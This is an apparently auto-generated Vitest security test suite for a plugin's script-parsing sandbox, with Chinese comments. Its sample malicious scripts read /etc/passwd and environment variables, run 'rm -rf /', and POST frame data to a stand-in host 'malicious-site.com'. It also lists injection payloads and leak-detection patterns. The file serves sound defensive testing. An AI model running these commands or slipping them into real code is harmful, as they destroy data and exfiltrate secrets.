/**
 * Serial-Studio VSCode 插件系统 - FrameParser 安全机制测试
 * 
 * 本测试文件实现了 FrameParser 的全面安全测试，覆盖：
 * - 沙箱安全测试
 * - 输入验证测试
 * - 资源限制测试
 * - 代码注入防护测试
 * - 恶意脚本检测测试
 * 
 * 基于 todo.md 中 P1-03 任务要求
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { FrameParser, ParseResult, ParserConfig } from '../mocks/FrameParser';

/**
 * 安全测试工具类
 */
class SecurityTestUtils {
  /**
   * 创建恶意脚本集合
   */
  static getMaliciousScripts(): Record<string, string> {
    return {
      // 尝试访问全局对象
      globalAccess: `
        function parse(frame) {
          return global.process.env; // 尝试访问进程环境变量
        }
      `,
      
      // 尝试访问require函数
      requireAccess: `
        function parse(frame) {
          const fs = require('fs'); // 尝试导入文件系统模块
          return fs.readFileSync('/etc/passwd', 'utf8').split('\\n');
        }
      `,
      
      // 尝试执行系统命令
      systemCommand: `
        function parse(frame) {
          const { exec } = require('child_process');
          exec('rm -rf /', () => {}); // 恶意系统命令
          return ['data'];
        }
      `,
      
      // 尝试访问process对象
      processAccess: `
        function parse(frame) {
          process.exit(1); // 尝试退出进程
          return ['data'];
        }
      `,
      
      // 尝试使用eval
      evalAttempt: `
        function parse(frame) {
          eval('console.log("eval executed")'); // 尝试使用eval
          return ['data'];
        }
      `,
      
      // 尝试创建新的Function
      functionConstructor: `
        function parse(frame) {
          const malicious = new Function('return global');
          return malicious();
        }
      `,
      
      // 无限循环攻击
      infiniteLoop: `
        function parse(frame) {
          while(true) {
            // 无限循环消耗CPU
          }
          return ['data'];
        }
      `,
      
      // 递归调用栈溢出
      stackOverflow: `
        function overflow() {
          return overflow();
        }
        
        function parse(frame) {
          return overflow();
        }
      `,
      
      // 大量内存分配
      memoryExhaustion: `
        function parse(frame) {
          const bigArray = new Array(100000000).fill('x'); // 尝试分配大量内存
          return ['data'];
        }
      `,
      
      // 尝试修改原型链
      prototypeModification: `
        function parse(frame) {
          Array.prototype.malicious = function() { return 'hacked'; };
          return ['data'];
        }
      `,
      
      // DOM访问尝试（在服务器环境中不应该可用）
      domAccess: `
        function parse(frame) {
          document.body.innerHTML = '<script>alert("XSS")</script>';
          return ['data'];
        }
      `,
      
      // 网络请求尝试
      networkRequest: `
        function parse(frame) {
          fetch('http://malicious-site.com/steal-data', {
            method: 'POST',
            body: JSON.stringify(frame)
          });
          return ['data'];
        }
      `
    };
  }

  /**
   * 创建各种恶意输入数据
   */
  static getMaliciousInputs(): Record<string, string> {
    return {
      xssAttempt: '<script>alert("XSS")</script>',
      sqlInjection: "'; DROP TABLE users; --",
      commandInjection: '; rm -rf /',
      pathTraversal: '../../etc/passwd',
      jsonInjection: '{"__proto__": {"isAdmin": true}}',
      binaryData: '\x00\x01\x02\x03',
      unicodeExploit: '\u0000\u0001\uFEFF',
      largeInput: 'A'.repeat(1000000), // 1MB string
      deepNesting: '{"a":'.repeat(10000) + '1' + '}'.repeat(10000),
      regexDos: 'a'.repeat(50000) + '!', // 可能导致正则表达式拒绝服务
      nullBytes: 'data\x00hidden',
      formatString: '%s%s%s%s%s%s%s%s%s%s',
      prototypePoison: 'constructor.prototype.polluted = true'
    };
  }

  /**
   * 测试是否存在信息泄露
   */
  static checkForInformationLeakage(result: ParseResult): boolean {
    if (!result.success || !result.datasets) {
      return false;
    }

    const leakagePatterns = [
      /process\.env/i,
      /require\(/i,
      /global\./i,
      /\/etc\/passwd/i,
      /C:\\Windows/i,
      /HOME/i,
      /PATH/i
    ];

    const resultString = JSON.stringify(result.datasets);
    return leakagePatterns.some(pattern => pattern.test(resultString));
  }
}

describe('FrameParser Security Tests', () => {
  let parser: FrameParser;

  beforeEach(() => {
    parser = new FrameParser({
      timeout: 1000,
      memoryLimit: 64 * 1024 * 1024, // 64MB
      enableConsole: false
    });
  });

  afterEach(() => {
    parser.destroy();
  });

  /**
   * 沙箱安全测试
   */
  describe('沙箱安全测试', () => {
    it('应该阻止访问全局对象', async () => {
      const maliciousScript = SecurityTestUtils.getMaliciousScripts().globalAccess;
      
      const result = parser.loadScript(maliciousScript);
      expect(result).toBe(false);
      
      // 如果脚本加载成功（不应该），测试执行时的安全性
      if (result) {
        const parseResult = parser.parse('test data');
        expect(parseResult.success).toBe(false);
        expect(parseResult.error).toContain('global');
      }
    });

    it('应该阻止文件系统访问', async () => {
      const maliciousScript = SecurityTestUtils.getMaliciousScripts().requireAccess;
      
      const result = parser.loadScript(maliciousScript);
      expect(result).toBe(false);
      
      if (result) {
        const parseResult = parser.parse('test data');
        expect(parseResult.success).toBe(false);
        expect(parseResult.error).toContain('require');
      }
    });

    it('应该阻止系统命令执行', async () => {
      const maliciousScript = SecurityTestUtils.getMaliciousScripts().systemCommand;
      
      const result = parser.loadScript(maliciousScript);
      expect(result).toBe(false);
    });

    it('应该阻止进程操作', async () => {
      const maliciousScript = SecurityTestUtils.getMaliciousScripts().processAccess;
      
      const result = parser.loadScript(maliciousScript);
      expect(result).toBe(false);
    });

    it('应该阻止eval使用', async () => {
      const maliciousScript = SecurityTestUtils.getMaliciousScripts().evalAttempt;
      
      const result = parser.loadScript(maliciousScript);
      expect(result).toBe(false);
    });

    it('应该阻止Function构造器', async () => {
      const maliciousScript = SecurityTestUtils.getMaliciousScripts().functionConstructor;
      
      const result = parser.loadScript(maliciousScript);
      expect(result).toBe(false);
    });

    it('应该阻止原型链污染', async () => {
      const maliciousScript = SecurityTestUtils.getMaliciousScripts().prototypeModification;
      
      parser.loadScript(maliciousScript);
      const parseResult = parser.parse('test');
      
      // 验证Array原型没有被污染
      expect((Array.prototype as any).malicious).toBeUndefined();
    });

    it('应该阻止DOM访问', async () => {
      const maliciousScript = SecurityTestUtils.getMaliciousScripts().domAccess;
      
      const result = parser.loadScript(maliciousScript);
      if (result) {
        const parseResult = parser.parse('test data');
        expect(parseResult.success).toBe(false);
        expect(parseResult.error).toContain('document');
      }
    });
  });

  /**
   * 执行时间限制测试
   */
  describe('执行时间限制测试', () => {
    it('应该限制执行时间', async () => {
      const infiniteLoopScript = SecurityTestUtils.getMaliciousScripts().infiniteLoop;
      
      const loadResult = parser.loadScript(infiniteLoopScript);
      if (loadResult) {
        const parseResult = parser.parse('test data');
        
        expect(parseResult.success).toBe(false);
        expect(parseResult.error).toMatch(/timeout|time/i);
        expect(parseResult.executionTime).toBeGreaterThan(1000); // 应该达到超时限制
      }
    });

    it('应该处理递归调用栈溢出', async () => {
      const stackOverflowScript = SecurityTestUtils.getMaliciousScripts().stackOverflow;
      
      const loadResult = parser.loadScript(stackOverflowScript);
      if (loadResult) {
        const parseResult = parser.parse('test data');
        
        expect(parseResult.success).toBe(false);
        expect(parseResult.error).toMatch(/stack|recursion|maximum/i);
      }
    });

    it('应该快速处理正常脚本', async () => {
      const validScript = `
        function parse(frame) {
          return frame.split(',');
        }
      `;
      
      parser.loadScript(validScript);
      const parseResult = parser.parse('1,2,3,4,5');
      
      expect(parseResult.success).toBe(true);
      expect(parseResult.executionTime).toBeLessThan(100); // 应该很快完成
    });
  });

  /**
   * 内存限制测试
   */
  describe('内存限制测试', () => {
    it('应该限制内存使用', async () => {
      const memoryExhaustionScript = SecurityTestUtils.getMaliciousScripts().memoryExhaustion;
      
      const loadResult = parser.loadScript(memoryExhaustionScript);
      if (loadResult) {
        const parseResult = parser.parse('test data');
        
        expect(parseResult.success).toBe(false);
        expect(parseResult.error).toMatch(/memory|out of memory/i);
      }
    });

    it('应该处理适度内存使用', async () => {
      const moderateMemoryScript = `
        function parse(frame) {
          const data = new Array(1000).fill(frame);
          return data.map((item, index) => item + index);
        }
      `;
      
      parser.loadScript(moderateMemoryScript);
      const parseResult = parser.parse('test');
      
      expect(parseResult.success).toBe(true);
      expect(parseResult.datasets).toHaveLength(1000);
    });
  });

  /**
   * 输入验证测试
   */
  describe('输入验证测试', () => {
    const maliciousInputs = SecurityTestUtils.getMaliciousInputs();

    beforeEach(() => {
      const validScript = `
        function parse(frame) {
          return frame.split(',');
        }
      `;
      parser.loadScript(validScript);
    });

    it('应该安全处理XSS攻击输入', async () => {
      const result = parser.parse(maliciousInputs.xssAttempt);
      
      expect(result.success).toBe(true);
      expect(SecurityTestUtils.checkForInformationLeakage(result)).toBe(false);
      expect(result.datasets.join('')).not.toContain('<script>');
    });

    it('应该安全处理SQL注入攻击输入', async () => {
      const result = parser.parse(maliciousInputs.sqlInjection);
      
      expect(result.success).toBe(true);
      expect(SecurityTestUtils.checkForInformationLeakage(result)).toBe(false);
    });

    it('应该安全处理命令注入攻击输入', async () => {
      const result = parser.parse(maliciousInputs.commandInjection);
      
      expect(result.success).toBe(true);
      expect(SecurityTestUtils.checkForInformationLeakage(result)).toBe(false);
    });

    it('应该安全处理路径遍历攻击输入', async () => {
      const result = parser.parse(maliciousInputs.pathTraversal);
      
      expect(result.success).toBe(true);
      expect(SecurityTestUtils.checkForInformationLeakage(result)).toBe(false);
    });

    it('应该安全处理二进制数据', async () => {
      const result = parser.parse(maliciousInputs.binaryData);
      
      expect(result.success).toBe(true);
      expect(SecurityTestUtils.checkForInformationLeakage(result)).toBe(false);
    });

    it('应该安全处理Unicode漏洞利用', async () => {
      const result = parser.parse(maliciousInputs.unicodeExploit);
      
      expect(result.success).toBe(true);
      expect(SecurityTestUtils.checkForInformationLeakage(result)).toBe(false);
    });

    it('应该处理大型输入数据', async () => {
      const result = parser.parse(maliciousInputs.largeInput);
      
      // 应该能处理或优雅地失败
      if (!result.success) {
        expect(result.error).toMatch(/memory|size|timeout/i);
      } else {
        expect(SecurityTestUtils.checkForInformationLeakage(result)).toBe(false);
      }
    });

    it('应该安全处理null字节', async () => {
      const result = parser.parse(maliciousInputs.nullBytes);
      
      expect(result.success).toBe(true);
      expect(SecurityTestUtils.checkForInformationLeakage(result)).toBe(false);
    });

    it('应该安全处理格式字符串攻击', async () => {
      const result = parser.parse(maliciousInputs.formatString);
      
      expect(result.success).toBe(true);
      expect(SecurityTestUtils.checkForInformationLeakage(result)).toBe(false);
    });
  });

  /**
   * 高级安全测试
   */
  describe('高级安全测试', () => {
    it('应该隔离多个解析器实例', async () => {
      const parser1 = new FrameParser();
      const parser2 = new FrameParser();

      const script1 = `
        var shared = 'parser1';
        function parse(frame) { 
          return [shared]; 
        }
      `;

      const script2 = `
        var shared = 'parser2';
        function parse(frame) { 
          return [shared]; 
        }
      `;

      parser1.loadScript(script1);
      parser2.loadScript(script2);

      const result1 = parser1.parse('test');
      const result2 = parser2.parse('test');

      expect(result1.datasets[0]).toBe('parser1');
      expect(result2.datasets[0]).toBe('parser2');

      parser1.destroy();
      parser2.destroy();
    });

    it('应该防止跨解析器数据泄露', async () => {
      const parser1 = new FrameParser();
      const parser2 = new FrameParser();

      const script1 = `
        var secret = 'secret-data-123';
        function parse(frame) { 
          return [frame]; 
        }
      `;

      const script2 = `
        function parse(frame) { 
          try {
            return [secret]; // 尝试访问其他解析器的变量
          } catch (e) {
            return ['no-access'];
          }
        }
      `;

      parser1.loadScript(script1);
      parser2.loadScript(script2);

      const result1 = parser1.parse('test');
      const result2 = parser2.parse('test');

      expect(result1.success).toBe(true);
      expect(result2.success).toBe(true);
      expect(result2.datasets[0]).toBe('no-access'); // 不应该能访问secret

      parser1.destroy();
      parser2.destroy();
    });

    it('应该限制同步执行，防止异步攻击', async () => {
      const asyncAttackScript = `
        function parse(frame) {
          setTimeout(() => {
            console.log('Async attack executed');
          }, 0);
          return ['data'];
        }
      `;

      const loadResult = parser.loadScript(asyncAttackScript);
      if (loadResult) {
        const parseResult = parser.parse('test');
        // 即使脚本成功加载，异步代码不应该执行
        expect(parseResult.success).toBe(true);
      }
    });

    it('应该防止WebAssembly执行', async () => {
      const wasmAttackScript = `
        function parse(frame) {
          const wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d]);
          WebAssembly.compile(wasmCode);
          return ['data'];
        }
      `;

      const loadResult = parser.loadScript(wasmAttackScript);
      if (loadResult) {
        const parseResult = parser.parse('test');
        expect(parseResult.success).toBe(false);
        expect(parseResult.error).toMatch(/WebAssembly|wasm/i);
      }
    });
  });

  /**
   * 配置安全测试
   */
  describe('配置安全测试', () => {
    it('应该拒绝危险的配置', async () => {
      const dangerousConfig: ParserConfig = {
        timeout: 0, // 无超时限制
        memoryLimit: Number.MAX_SAFE_INTEGER, // 无内存限制
        enableConsole: true
      };

      const secureParser = new FrameParser(dangerousConfig);
      
      // 验证配置被安全地处理
      const config = secureParser.getConfig();
      expect(config.timeout).toBeGreaterThan(0);
      expect(config.memoryLimit).toBeLessThan(Number.MAX_SAFE_INTEGER);

      secureParser.destroy();
    });

    it('应该正确应用安全配置', async () => {
      const secureConfig: ParserConfig = {
        timeout: 500,
        memoryLimit: 32 * 1024 * 1024, // 32MB
        enableConsole: false
      };

      const secureParser = new FrameParser(secureConfig);
      const config = secureParser.getConfig();

      expect(config.timeout).toBe(500);
      expect(config.memoryLimit).toBe(32 * 1024 * 1024);
      expect(config.enableConsole).toBe(false);

      secureParser.destroy();
    });
  });

  /**
   * 错误处理安全测试
   */
  describe('错误处理安全测试', () => {
    it('应该不在错误消息中泄露敏感信息', async () => {
      const maliciousScript = `
        function parse(frame) {
          throw new Error('Error with sensitive info: ' + process.env.HOME);
        }
      `;

      const loadResult = parser.loadScript(maliciousScript);
      if (loadResult) {
        const parseResult = parser.parse('test');
        
        expect(parseResult.success).toBe(false);
        expect(parseResult.error).toBeDefined();
        expect(SecurityTestUtils.checkForInformationLeakage(parseResult)).toBe(false);
      }
    });

    it('应该安全地处理语法错误', async () => {
      const syntaxErrorScript = `
        function parse(frame) {
          return frame.split(',');
        }
        
        // 故意的语法错误
        %%%invalid%%%
      `;

      const loadResult = parser.loadScript(syntaxErrorScript);
      expect(loadResult).toBe(false);
      
      // 确保错误处理没有暴露系统信息
      const parseResult = parser.parse('test');
      expect(parseResult.success).toBe(false);
      expect(SecurityTestUtils.checkForInformationLeakage(parseResult)).toBe(false);
    });
  });

  /**
   * 性能安全测试
   */
  describe('性能安全测试', () => {
    it('应该防止正则表达式拒绝服务攻击', async () => {
      const regexDosScript = `
        function parse(frame) {
          const maliciousRegex = /^(a+)+$/;
          const maliciousInput = 'a'.repeat(50) + '!';
          maliciousRegex.test(maliciousInput);
          return ['data'];
        }
      `;

      parser.loadScript(regexDosScript);
      const startTime = Date.now();
      const parseResult = parser.parse('test');
      const endTime = Date.now();

      // 应该在合理时间内完成或超时
      expect(endTime - startTime).toBeLessThan(2000);
      
      if (!parseResult.success) {
        expect(parseResult.error).toMatch(/timeout|time|regex/i);
      }
    });

    it('应该处理CPU密集型计算', async () => {
      const cpuIntensiveScript = `
        function parse(frame) {
          let sum = 0;
          for (let i = 0; i < 1000000; i++) {
            sum += Math.sqrt(i);
          }
          return [sum.toString()];
        }
      `;

      parser.loadScript(cpuIntensiveScript);
      const parseResult = parser.parse('test');

      // 应该在合理时间内完成或超时
      expect(parseResult.executionTime).toBeLessThan(2000);
      
      if (!parseResult.success) {
        expect(parseResult.error).toMatch(/timeout|time/i);
      }
    });
  });
});